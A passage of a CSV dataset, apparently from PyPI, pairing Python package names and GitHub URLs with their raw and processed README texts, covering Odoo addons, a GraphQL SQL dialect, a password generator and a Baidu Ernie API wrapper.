pkg,github_url,n_requirements,raw_readme_len,processed_readme_len,raw_readme,processed_readme,slug
hexapterygon,https://github.com/GiorgosXou/hexapterygon,0,0,0,,,giorgosxou/hexapterygon
hakurei-sqlalchemy-graphqlapi,https://github.com/cancan101/graphql-db-api,4,2237,2237,"# graphql-db-api [![PyPI version](https://badge.fury.io/py/sqlalchemy-graphqlapi.svg)](https://badge.fury.io/py/sqlalchemy-graphqlapi) ![main workflow](https://github.com/cancan101/graphql-db-api/actions/workflows/main.yml/badge.svg) [![codecov](https://codecov.io/gh/cancan101/graphql-db-api/branch/main/graph/badge.svg?token=TOI17GOA2O)](https://codecov.io/gh/cancan101/graphql-db-api)

A Python DB API 2.0 for GraphQL APIs

This module allows you to query GraphQL APIs using SQL.

## SQLAlchemy support

This module provides a SQLAlchemy dialect.

```python
from sqlalchemy.engine import create_engine

engine = create_engine('graphql://host:port/path?is_https=0')
```

### Example Usage

#### Querying Connections

```python
from sqlalchemy import create_engine
from sqlalchemy import text

# We use GraphQL SWAPI (The Star Wars API) c/o Netlify:
engine = create_engine('graphql://swapi-graphql.netlify.app/.netlify/functions/index')

with engine.connect() as connection:
    # Demonstration of requesting nested resource of homeworld
    # and then selecting fields from it
    for row in connection.execute(text(""select name, homeworld__name from 'allPeople?include=homeworld'"")):
        print(row)
```

#### Querying Lists

```python
from sqlalchemy import create_engine
from sqlalchemy import text

engine = create_engine('graphql://pet-library.moonhighway.com/')

with engine.connect() as connection:
    for row in connection.execute(text(""select id, name from 'allPets?is_connection=0'"")):
        print(row)
```

## Superset support

In order to use with Superset, install this package and then use the `graphql` protocol in the SQLAlchemy URI like: `graphql://swapi-graphql.netlify.app/.netlify/functions/index`. We install a [`db_engine_spec`](https://github.com/cancan101/graphql-db-api/blob/main/graphqldb/db_engine_specs.py) so Superset should recognize the driver.

## Roadmap

- [x] Non-Connections top level
- [x] Path traversal (basic)
- [ ] Path traversal (basic + nested)
- [ ] Path traversal (list / connection)
- [x] Bearer Tokens in `Authorization` Header
- [ ] Advanced Auth (e.g. with token refresh)
- [ ] Passing Headers (e.g. Auth in other locations)
- [ ] Filtering
- [ ] Sorting
- [x] Relay Pagination


","# graphql-db-api [![PyPI version](https://badge.fury.io/py/sqlalchemy-graphqlapi.svg)](https://badge.fury.io/py/sqlalchemy-graphqlapi) ![main workflow](https://github.com/cancan101/graphql-db-api/actions/workflows/main.yml/badge.svg) [![codecov](https://codecov.io/gh/cancan101/graphql-db-api/branch/main/graph/badge.svg?token=TOI17GOA2O)](https://codecov.io/gh/cancan101/graphql-db-api)

A Python DB API 2.0 for GraphQL APIs

This module allows you to query GraphQL APIs using SQL.

## SQLAlchemy support

This module provides a SQLAlchemy dialect.

```python
from sqlalchemy.engine import create_engine

engine = create_engine('graphql://host:port/path?is_https=0')
```

### Example Usage

#### Querying Connections

```python
from sqlalchemy import create_engine
from sqlalchemy import text

# We use GraphQL SWAPI (The Star Wars API) c/o Netlify:
engine = create_engine('graphql://swapi-graphql.netlify.app/.netlify/functions/index')

with engine.connect() as connection:
    # Demonstration of requesting nested resource of homeworld
    # and then selecting fields from it
    for row in connection.execute(text(""select name, homeworld__name from 'allPeople?include=homeworld'"")):
        print(row)
```

#### Querying Lists

```python
from sqlalchemy import create_engine
from sqlalchemy import text

engine = create_engine('graphql://pet-library.moonhighway.com/')

with engine.connect() as connection:
    for row in connection.execute(text(""select id, name from 'allPets?is_connection=0'"")):
        print(row)
```

## Superset support

In order to use with Superset, install this package and then use the `graphql` protocol in the SQLAlchemy URI like: `graphql://swapi-graphql.netlify.app/.netlify/functions/index`. We install a [`db_engine_spec`](https://github.com/cancan101/graphql-db-api/blob/main/graphqldb/db_engine_specs.py) so Superset should recognize the driver.

## Roadmap

- [x] Non-Connections top level
- [x] Path traversal (basic)
- [ ] Path traversal (basic + nested)
- [ ] Path traversal (list / connection)
- [x] Bearer Tokens in `Authorization` Header
- [ ] Advanced Auth (e.g. with token refresh)
- [ ] Passing Headers (e.g. Auth in other locations)
- [ ] Filtering
- [ ] Sorting
- [x] Relay Pagination


",cancan101/graphql-db-api
odoo12-addon-fieldservice-calendar,https://github.com/OCA/field-service,2,3120,2723,"========================
Field Service - Calendar
========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Ffield--service-lightgray.png?logo=github
    :target: https://github.com/OCA/field-service/tree/12.0/fieldservice_calendar
    :alt: OCA/field-service
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/field-service-12-0/field-service-12-0-fieldservice_calendar
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/264/12.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This modules creates calendar event from FSM Orders.

**Table of contents**

.. contents::
   :local:

Configuration
=============

A ""calendar"" user should be set on FSM Team. Events will be added to his calendar.
Then the FSM Order' person_id (worker) will be an attendee of the calendar's event (Meeting).

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/field-service/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/field-service/issues/new?body=module:%20fieldservice_calendar%0Aversion:%2012.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Akretion

Contributors
~~~~~~~~~~~~

* Raphaël Reverdy <raphael.reverdy@akretion.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-hparfr| image:: https://github.com/hparfr.png?size=40px
    :target: https://github.com/hparfr
    :alt: hparfr

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-hparfr| 

This module is part of the `OCA/field-service <https://github.com/OCA/field-service/tree/12.0/fieldservice_calendar>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","========================
Field Service - Calendar
========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Ffield--service-lightgray.png?logo=github
    :target: https://github.com/OCA/field-service/tree/12.0/fieldservice_calendar
    :alt: OCA/field-service
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/field-service-12-0/field-service-12-0-fieldservice_calendar
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/264/12.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This modules creates calendar event from FSM Orders.

**Table of contents**

.. contents::
   :local:

Configuration
=============

A ""calendar"" user should be set on FSM Team. Events will be added to his calendar.
Then the FSM Order' person_id (worker) will be an attendee of the calendar's event (Meeting).

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Akretion

Contributors
~~~~~~~~~~~~

* Raphaël Reverdy 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-hparfr| image:: https://github.com/hparfr.png?size=40px
    :target: https://github.com/hparfr
    :alt: hparfr

Current `maintainer `__:

|maintainer-hparfr| 

This module is part of the `OCA/field-service `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/field-service
shark-sac-korean-editor,https://github.com/sharkwodm/koreditor,0,148,148,"1. modkr 폴더를 다운로드폴더 안에넣어주세요
2. Termux어플에서  cd /sdcard/Download를 쳐주세요
3.pkg install python 
4.pip install 
5.pkg upgrade 
6. python -m modkr

","1. modkr 폴더를 다운로드폴더 안에넣어주세요
2. Termux어플에서  cd /sdcard/Download를 쳐주세요
3.pkg install python 
4.pip install 
5.pkg upgrade 
6. python -m modkr

",sharkwodm/koreditor
passwordtools-yt,https://github.com/Yair-T/passwordtools,0,1397,1397,"# passwordtools.
This Python package provides functions for generating and testing passwords. The password generator can create passwords of different lengths and complexity, and the password strength tester can assess the security of a password. The password generator uses a random number generator to generate random passwords. The Password Strength Checker uses a variety of factors to assess password security, including password length, and password complexity. This package is an invaluable tool for anyone who needs to create or test passwords.
    
### Features.
- Generates random passwords of a specified length.
- Includes letters (both uppercase and lowercase), digits, and punctuation.
- Can be used to generate strong passwords that are difficult to crack.
- Checking the strength of passwords.
## Installation.
To install passwordtools, use the following command:

    pip install passwordtool-yt


For more info, go to documentation.
## Documentation.

For more information on how to use PasswordGenerator, please refer to the documentation website:
https://yair-t.github.io/passwordtools-docs


### License
passwordtools is licensed under the MIT License.



------------
Legal clarification: The service is provided ""as is"". The tool does not prevent account hacking, the use is the sole responsibility of the user. No warranty of any kind is given.
","# passwordtools.
This Python package provides functions for generating and testing passwords. The password generator can create passwords of different lengths and complexity, and the password strength tester can assess the security of a password. The password generator uses a random number generator to generate random passwords. The Password Strength Checker uses a variety of factors to assess password security, including password length, and password complexity. This package is an invaluable tool for anyone who needs to create or test passwords.
    
### Features.
- Generates random passwords of a specified length.
- Includes letters (both uppercase and lowercase), digits, and punctuation.
- Can be used to generate strong passwords that are difficult to crack.
- Checking the strength of passwords.
## Installation.
To install passwordtools, use the following command:

    pip install passwordtool-yt


For more info, go to documentation.
## Documentation.

For more information on how to use PasswordGenerator, please refer to the documentation website:
https://yair-t.github.io/passwordtools-docs


### License
passwordtools is licensed under the MIT License.



------------
Legal clarification: The service is provided ""as is"". The tool does not prevent account hacking, the use is the sole responsibility of the user. No warranty of any kind is given.
",yair-t/passwordtools
botocore-a-la-carte-osis,https://github.com/thejcannon/botocore-a-la-carte,0,0,0,,,thejcannon/botocore-a-la-carte
easy-ernie,https://github.com/XiaoXinYo/Easy-Ernie,1,800,800,"![Release](https://img.shields.io/badge/Release-0.1.3-blue)
---
## 介绍
简洁的调用文心一言的WebAPI
## 需求
1. 语言: Python3.8+.
2. 包: requests.
3. 其他: 文心一言账户.
## 安装
pip3 install easy-ernie
## Cookie
![图片1](https://s1.ax1x.com/2023/04/26/p9KDUYR.md.png)
1. 访问[文心一言](https://yiyan.baidu.com).
2. 打开开发者工具.
3. 找到应用程序(Application).
4. 在左侧点击存储(Storage)-Cookies-https://yiyan.baidu.com.
5. 在列表中点击BAIDUID.
6. 复制下方Cookie Value的值.
7. BDUSS_BFESS同理.
## 使用
```python
from easy_ernie import FastErnie

if __name__ == '__main__':
    fastErnie = FastErnie('BAIDUID', 'BDUSS_BFESS')
    print(fastErnie.ask('你好'))
```
更多方法查看[Wiki](https://github.com/XiaoXinYo/Easy-Ernie/wiki).
## Acs-Token
由于文心一言的Acs-Token算法中的参数不定时的变化,所以包里调用了API.感兴趣的可以联系我.
## 感谢
灵感来源自[acheong08](https://github.com/acheong08),[ls233](https://github.com/lss233).
","![Release](https://img.shields.io/badge/Release-0.1.3-blue)
---
## 介绍
简洁的调用文心一言的WebAPI
## 需求
1. 语言: Python3.8+.
2. 包: requests.
3. 其他: 文心一言账户.
## 安装
pip3 install easy-ernie
## Cookie
![图片1](https://s1.ax1x.com/2023/04/26/p9KDUYR.md.png)
1. 访问[文心一言](https://yiyan.baidu.com).
2. 打开开发者工具.
3. 找到应用程序(Application).
4. 在左侧点击存储(Storage)-Cookies-https://yiyan.baidu.com.
5. 在列表中点击BAIDUID.
6. 复制下方Cookie Value的值.
7. BDUSS_BFESS同理.
## 使用
```python
from easy_ernie import FastErnie

if __name__ == '__main__':
    fastErnie = FastErnie('BAIDUID', 'BDUSS_BFESS')
    print(fastErnie.ask('你好'))
```
更多方法查看[Wiki](https://github.com/XiaoXinYo/Easy-Ernie/wiki).
## Acs-Token
由于文心一言的Acs-Token算法中的参数不定时的变化,所以包里调用了API.感兴趣的可以联系我.
## 感谢
灵感来源自[acheong08](https://github.com/acheong08),[ls233](https://github.com/lss233).
",xiaoxinyo/easy-ernie
miniagent,https://github.com/tanminkwan/local-agent,0,1766,1766,"# Miniagent

Miniagent is a multi-adaptable and lightweight server framework based on **Flask**.

## Installing

Install and update using **pip**:
`$ pip install -U miniagent`

## Example code download

Create an example project after installing miniagent

`$ mini-project tanminkwan/local-agent test_project`

Then test_project directory and files are created like the tree below.
```
└── test_project
    ├── run.py
    ├── config.py
    └── myapp
        ├── __init__.py
        ├── adaptee.py
        ├── adapter.py
        ├── dbquery.py
        ├── executer.py
        └── model
            ├── __init__.py
            └── mymodels.py
```

## A Simple Example

There must be two files config.py and run.py in the base directory.
```
# this is a sample config.py
import os
from datetime import datetime, timedelta

COMMANDER_SERVER_URL = 'http://localhost:8809'

base_dir = os.path.abspath(os.path.dirname(__file__))
SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(base_dir, 'app.db')

CUSTOM_MODELS_PATH = ""example.model""

DEFAULT_ADAPTEES =\
{
    ""example.adapter.printer_adapters.PrinterAdapter"":
    ""example.adaptee.tadaptees.CardPrinterAdaptee"",
    ""example.adapter.payment_adapters.PaymentAdapter"":
    ""example.adaptee.tadaptees.CreditCardPaymentAdaptee"",
}
SCHEDULED_JOBS =\
[
    {
        ""executer"":""example.executer.scheduler.DeviceHealth"",
        ""trigger"":""interval"",
        ""id"":""DeviceHealth"",
        ""name"":""Devices Health Check"",
        ""minutes"":5,
        ""start_date"":datetime.now()+timedelta(minutes=1)
    }
]
```
```
# save this as run.py
from miniagent import app

app.run(host=""0.0.0.0"", port=17080, use_reloader=False, debug=True)
```
```
$ python run.py
  * Running on http://127.0.0.1:17080/ (Press CTRL+C to quit)
```
","# Miniagent

Miniagent is a multi-adaptable and lightweight server framework based on **Flask**.

## Installing

Install and update using **pip**:
`$ pip install -U miniagent`

## Example code download

Create an example project after installing miniagent

`$ mini-project tanminkwan/local-agent test_project`

Then test_project directory and files are created like the tree below.
```
└── test_project
    ├── run.py
    ├── config.py
    └── myapp
        ├── __init__.py
        ├── adaptee.py
        ├── adapter.py
        ├── dbquery.py
        ├── executer.py
        └── model
            ├── __init__.py
            └── mymodels.py
```

## A Simple Example

There must be two files config.py and run.py in the base directory.
```
# this is a sample config.py
import os
from datetime import datetime, timedelta

COMMANDER_SERVER_URL = 'http://localhost:8809'

base_dir = os.path.abspath(os.path.dirname(__file__))
SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(base_dir, 'app.db')

CUSTOM_MODELS_PATH = ""example.model""

DEFAULT_ADAPTEES =\
{
    ""example.adapter.printer_adapters.PrinterAdapter"":
    ""example.adaptee.tadaptees.CardPrinterAdaptee"",
    ""example.adapter.payment_adapters.PaymentAdapter"":
    ""example.adaptee.tadaptees.CreditCardPaymentAdaptee"",
}
SCHEDULED_JOBS =\
[
    {
        ""executer"":""example.executer.scheduler.DeviceHealth"",
        ""trigger"":""interval"",
        ""id"":""DeviceHealth"",
        ""name"":""Devices Health Check"",
        ""minutes"":5,
        ""start_date"":datetime.now()+timedelta(minutes=1)
    }
]
```
```
# save this as run.py
from miniagent import app

app.run(host=""0.0.0.0"", port=17080, use_reloader=False, debug=True)
```
```
$ python run.py
  * Running on http://127.0.0.1:17080/ (Press CTRL+C to quit)
```
",tanminkwan/local-agent
jsonvalue2markdown,https://github.com/snjyor/jsonvalue2markdown,0,1430,1430,"对任意json格式的数据，转换成markdown格式的文本
## 安装

```bash
pip install jsonvalue2markdown
```

## 用法示例

```python
from jsonvalue2markdown import JsonValueToMarkdown
json_value = {
        ""title"": ""标题"",
        ""context"": {
            ""subtitle"": ""副标题"",
            ""context1"": ""内容1"",
            ""context2"": ""内容2"",
            ""context6"": [
                ""内容3"",
                ""内容4"",
                {
                    ""context7"": ""内容5"",
                    ""context8"": ""内容6"",
                },
                {""context9"": ""内容10""}
            ],
            ""context3"": ""内容7"",
            ""context4"": ""https://www.test.demo.jpg"",
        },
    }

mapping_dict = {
        ""title"": ""h1"",
        ""subtitle"": ""h2"",
        ""context1"": ""p"",
        ""context2"": ""li"",
        ""context7"": ""li"",
        ""context8"": ""li"",
        ""context3"": ""li"",
        ""context4"": ""img"",
        ""context9"": ""p"",
    }

markdown = JsonValueToMarkdown(
        json_value=json_value,
        mapping_dict=mapping_dict,
        title_level=3,
    ).convert()
print(markdown)
```

## 参数说明
| 参数           | 说明                            |
|:-------------|:------------------------------|
| json_value   | 需要转换为markdown格式的json数据        |
| mapping_dict | json数据中的key与markdown中的标签的映射关系 |
| title_level  | 标题的级别，从1开始，最大为6               |

## 输出结果
```markdown
#标题
##副标题
内容1

  * 内容2
内容3

内容4

  * 内容5
  * 内容6
内容10

  * 内容7
![](https://www.test.demo.jpg)
```


","对任意json格式的数据，转换成markdown格式的文本
## 安装

```bash
pip install jsonvalue2markdown
```

## 用法示例

```python
from jsonvalue2markdown import JsonValueToMarkdown
json_value = {
        ""title"": ""标题"",
        ""context"": {
            ""subtitle"": ""副标题"",
            ""context1"": ""内容1"",
            ""context2"": ""内容2"",
            ""context6"": [
                ""内容3"",
                ""内容4"",
                {
                    ""context7"": ""内容5"",
                    ""context8"": ""内容6"",
                },
                {""context9"": ""内容10""}
            ],
            ""context3"": ""内容7"",
            ""context4"": ""https://www.test.demo.jpg"",
        },
    }

mapping_dict = {
        ""title"": ""h1"",
        ""subtitle"": ""h2"",
        ""context1"": ""p"",
        ""context2"": ""li"",
        ""context7"": ""li"",
        ""context8"": ""li"",
        ""context3"": ""li"",
        ""context4"": ""img"",
        ""context9"": ""p"",
    }

markdown = JsonValueToMarkdown(
        json_value=json_value,
        mapping_dict=mapping_dict,
        title_level=3,
    ).convert()
print(markdown)
```

## 参数说明
| 参数           | 说明                            |
|:-------------|:------------------------------|
| json_value   | 需要转换为markdown格式的json数据        |
| mapping_dict | json数据中的key与markdown中的标签的映射关系 |
| title_level  | 标题的级别，从1开始，最大为6               |

## 输出结果
```markdown
#标题
##副标题
内容1

  * 内容2
内容3

内容4

  * 内容5
  * 内容6
内容10

  * 内容7
![](https://www.test.demo.jpg)
```


",snjyor/jsonvalue2markdown
palmers-preprocess,https://github.com/pypa/sampleproject,0,321,321,"# Palmers Preprocess Package

This is a package for preprocessing data for machine learning. It is a work in progress and is not yet ready for use.

# To Upload
py -m build
twine upload dist/*




# ----- DELETE -------

to start venv

C:\Users\assafm\.virtualenvs\sdatta_packages\palmers_preprocess\Scripts\activate




","# Palmers Preprocess Package

This is a package for preprocessing data for machine learning. It is a work in progress and is not yet ready for use.

# To Upload
py -m build
twine upload dist/*




# ----- DELETE -------

to start venv

C:\Users\assafm\.virtualenvs\sdatta_packages\palmers_preprocess\Scripts\activate




",pypa/sampleproject
qeng-admin-api,https://github.com/Phaust94/qeng_admin_api,0,46,46,"Administrative API for the QEng quest engine

","Administrative API for the QEng quest engine

",phaust94/qeng_admin_api
odoo14-addon-stock-location-orderpoint,https://github.com/OCA/stock-logistics-warehouse,3,5640,5169,"=========================
stock_location_orderpoint
=========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-14-0/stock-logistics-warehouse-14-0-stock_location_orderpoint
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Declare orderpoint on a location allowing to replenish any product with the same criteria.
This is for an internal warehouse replenishment currently not compatible with the purchase buy route.

**Table of contents**

.. contents::
   :local:

Configuration
=============

First configuration
===================

#. In order to replenish your stock location from another one, you first need
   to set the multi locations configuration.
#. So, go to Inventory > Configuration > Settings > Warehouse
#. Check the 'Storage Locations' box.
#. As you should be able to configure a dedicated route to replenishment, you
   should also activate, in the same menu, the 'Multi-Step Routes' box.

Locations configuration
=======================

#. Identify the location you want to apply a replenishment rule (e.g.: WH/Stock)
#. Create (if not exists) a new location for replenishment under Warehouse view (e.g.: WH)
   location as we want to get the stock in replenishment taken into account of
   our product stock total quantity.

Route Configuration
===================

#. You should configure at least a route with a rule that:

    * Pull from the Replenishment stock location.
    * For the stock location you want to (e.g.: WH/Stock)

Location Orderpoint configuration
=================================

#. Go either by the stock location you want to replenish and click on 'Orderpoints'
   or go to Inventory > Configuration > Settings > Warehouse > Stock Location Orderpoint
#. Click on 'Create'
#. Set a sequence
#. Choose if the rule will be applied:

    * Automatically (Auto/realtime): at each stock movement on the stock location, the rule will be
      evaluated.
    * Manually (Manual): If set, an action 'Run Replenishment' will be displayed on the rule
      and allow to run it manually.
    * by cron (Scheduled): A cron job will trigger the replenishment rules of this kind.
#. Choose a replenish method:

    * Fill up: The replenishment will be triggered when a move is waiting availability
      and forecast quantity is negative at the location (i.e. min=0). The replenished quantity will
      bring back the forecast quantity to 0 (i.e. max=0) but will be limited to what is available at
      the source location to plan only reservable replenishment moves.
#. Choose the location to replenish
#. Choose the route to use to replenish. The source location will be computed automatically based on
   the route value.
#. Define a procurement group if you want to group some movements together.
#. Define a priority for the created moves.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/stock-logistics-warehouse/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/stock-logistics-warehouse/issues/new?body=module:%20stock_location_orderpoint%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software
* BCIM

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) <mtietz@mt-software.de>
* Jacques-Etienne Baudoux (BCIM) <je@bcim.be>
* Denis Roussel <denis.roussel@acsone.eu>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-mt-software-de| image:: https://github.com/mt-software-de.png?size=40px
    :target: https://github.com/mt-software-de
    :alt: mt-software-de

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-mt-software-de| 

This module is part of the `OCA/stock-logistics-warehouse <https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=========================
stock_location_orderpoint
=========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/14.0/stock_location_orderpoint
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-14-0/stock-logistics-warehouse-14-0-stock_location_orderpoint
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Declare orderpoint on a location allowing to replenish any product with the same criteria.
This is for an internal warehouse replenishment currently not compatible with the purchase buy route.

**Table of contents**

.. contents::
   :local:

Configuration
=============

First configuration
===================

#. In order to replenish your stock location from another one, you first need
   to set the multi locations configuration.
#. So, go to Inventory > Configuration > Settings > Warehouse
#. Check the 'Storage Locations' box.
#. As you should be able to configure a dedicated route to replenishment, you
   should also activate, in the same menu, the 'Multi-Step Routes' box.

Locations configuration
=======================

#. Identify the location you want to apply a replenishment rule (e.g.: WH/Stock)
#. Create (if not exists) a new location for replenishment under Warehouse view (e.g.: WH)
   location as we want to get the stock in replenishment taken into account of
   our product stock total quantity.

Route Configuration
===================

#. You should configure at least a route with a rule that:

    * Pull from the Replenishment stock location.
    * For the stock location you want to (e.g.: WH/Stock)

Location Orderpoint configuration
=================================

#. Go either by the stock location you want to replenish and click on 'Orderpoints'
   or go to Inventory > Configuration > Settings > Warehouse > Stock Location Orderpoint
#. Click on 'Create'
#. Set a sequence
#. Choose if the rule will be applied:

    * Automatically (Auto/realtime): at each stock movement on the stock location, the rule will be
      evaluated.
    * Manually (Manual): If set, an action 'Run Replenishment' will be displayed on the rule
      and allow to run it manually.
    * by cron (Scheduled): A cron job will trigger the replenishment rules of this kind.
#. Choose a replenish method:

    * Fill up: The replenishment will be triggered when a move is waiting availability
      and forecast quantity is negative at the location (i.e. min=0). The replenished quantity will
      bring back the forecast quantity to 0 (i.e. max=0) but will be limited to what is available at
      the source location to plan only reservable replenishment moves.
#. Choose the location to replenish
#. Choose the route to use to replenish. The source location will be computed automatically based on
   the route value.
#. Define a procurement group if you want to group some movements together.
#. Define a priority for the created moves.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software
* BCIM

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) 
* Jacques-Etienne Baudoux (BCIM) 
* Denis Roussel 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-mt-software-de| image:: https://github.com/mt-software-de.png?size=40px
    :target: https://github.com/mt-software-de
    :alt: mt-software-de

Current `maintainer `__:

|maintainer-mt-software-de| 

This module is part of the `OCA/stock-logistics-warehouse `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/stock-logistics-warehouse
local-age-detection-python-backend,https://github.com/javatechy/dokr,0,72,72,"This is a package for running age detection and getting approximate age
","This is a package for running age detection and getting approximate age
",javatechy/dokr
nneten,https://github.com/izotov93/NNetEn,2,2672,2672,"[![License](https://img.shields.io/badge/License-BSD-blue.svg)](https://opensource.org/licenses/BSD-3-Clause)
[![DOI](https://img.shields.io/badge/DOI-arxiv-green)](https://arxiv.org/abs/2303.17995)

# Neural Network Entropy (NNetEn)

